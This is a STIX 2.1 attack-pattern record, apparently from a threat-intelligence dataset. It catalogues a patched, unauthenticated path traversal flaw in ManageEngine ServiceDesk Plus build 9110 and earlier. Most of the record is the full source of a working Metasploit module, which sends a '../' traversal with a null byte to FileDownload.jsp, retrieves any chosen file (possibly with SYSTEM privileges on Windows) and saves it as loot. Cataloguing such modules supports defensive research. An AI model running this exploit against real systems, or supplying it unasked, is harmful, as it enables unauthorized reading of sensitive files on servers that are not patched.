{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e34deed7-49c1-44e5-979c-7bb0f24fe9a2",
    "created": "2024-08-14T16:29:07.605559Z",
    "modified": "2024-08-14T16:29:07.605562Z",
    "name": "\"ManageEngine ServiceDesk Plus Path Traversal\"",
    "description": " This module exploits an unauthenticated path traversal vulnerability found in ManageEngine ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem with the same privileges as Support Center Plus is running. On Windows, files can be retrieved with SYSTEM privileges. The issue has been resolved in ServiceDesk Plus build 91111 (issue SD-60283).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/servicedesk_plus_traversal.rb",
            "external_id": "servicedesk_plus_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.manageengine.com/products/service-desk/readme-9.1.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ManageEngine ServiceDesk Plus Path Traversal\",\n      'Description'    => %q{\n        This module exploits an unauthenticated path traversal vulnerability found in ManageEngine\n        ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem\n        with the same privileges as Support Center Plus is running. On Windows, files can be retrieved\n        with SYSTEM privileges. The issue has been resolved in ServiceDesk Plus build 91111 (issue SD-60283).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module\n      'References'     =>\n        [\n          ['URL', 'https://www.manageengine.com/products/service-desk/readme-9.1.html'],\n        ],\n      'DisclosureDate' => '2015-10-03'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),\n        OptString.new('TARGETURI', [true, 'The base path to the ServiceDesk Plus installation', '/']),\n        OptString.new('FILE', [true, 'The file to retrieve', '/windows/win.ini'])\n      ])\n  end\n\n  def run_host(ip)\n    uri = target_uri.path\n    traversal = \"../\" * datastore['DEPTH']\n    filename = datastore['FILE']\n    filename = filename[1, filename.length] if filename =~ /^\\//\n\n    vprint_status(\"Retrieving file #{datastore['FILE']}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"workorder\", \"FileDownload.jsp\"),\n      'vars_get' =>\n      {\n        'module' => 'support',\n        'fName' => \"#{traversal}#{filename}\\x00\",\n      }\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have retrieved the file either. Print the status code for debugging purposes.\n    # The \"The File was not found\" string is returned on a vulnerable environment but the file is not found.\n    # The \"Loding domain list To login AD authentication or local Authentication\" string is returned in the response on a fixed version (build 9111)\n    if res && res.code == 200\n      if res.body =~ /The File was not found/\n        vprint_error(\"Vulnerable server, but the file does not exist!\")\n      elsif res.body =~ /Loding domain list To login AD authentication or local Authentication/\n        vprint_error(\"The installed version of ManageEngine ServiceDesk Plus is not vulnerable!\")\n      else\n        p = store_loot(\n          'manageengine.servicedeskplus',\n          'application/octet-stream',\n          ip,\n          res.body,\n          filename\n        )\n        print_good(\"File saved in: #{p}\")\n      end\n    else\n        vprint_error(\"Connection timed out\")\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2015-10-03"
}